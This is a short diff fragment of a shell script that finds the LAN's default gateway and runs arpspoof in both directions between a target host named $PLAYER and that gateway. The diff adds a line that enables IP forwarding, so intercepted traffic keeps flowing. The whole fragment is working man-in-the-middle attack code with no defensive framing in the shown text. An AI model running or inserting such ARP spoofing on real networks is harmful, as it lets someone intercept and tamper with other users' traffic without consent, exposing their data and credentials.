@@ -39,6 +39,7 @@ gateway=$(ip route | grep -o -P '(?<=default via )[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+
 clean
 
 # spoof gateway and player
+echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i $ETH -t $PLAYER $gateway &> /dev/null &
 arpspoof -i $ETH -t $gateway $PLAYER &> /dev/null &
 
